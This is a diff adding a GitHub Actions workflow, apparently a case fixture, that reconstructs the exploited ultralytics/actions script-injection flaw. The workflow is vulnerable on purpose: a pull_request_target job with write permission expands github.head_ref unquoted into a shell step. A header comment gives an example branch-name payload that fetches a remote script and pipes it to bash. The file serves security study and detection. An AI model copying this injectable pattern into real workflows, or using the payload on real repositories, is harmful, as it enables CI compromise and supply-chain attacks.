@@ -1,0 +1,27 @@
+# Case: ultralytics/actions composite step, github.head_ref injected into a shell script (GHSA-7x29-qqmq-v6qc; Dec 2024 compromise)
+# Date: 2024-08-14 (GHSA published); exploited in the wild 2024-12-04/05
+# Source: https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc
+#         https://www.blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection
+# Pattern: a run step in a pull_request_target context expands github.head_ref (the attacker-chosen
+# branch name, e.g. $({curl,-sSfL,host/file.sh}${IFS}|${IFS}bash)) unquoted into the script.
+# The original step lived in a composite action.yml; it is re-written here as a workflow job step.
+name: Commit formatted changes
+
+on:
+  pull_request_target:
+
+permissions:
+  contents: write
+
+jobs:
+  push-format:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Commit and push changes
+        if: github.event.action != 'closed'
+        run: |
+          git config --global user.name "example-bot"
+          git pull origin ${{ github.head_ref || github.ref }}
+          git add .
+          git commit -m "Auto-format"
+          git push
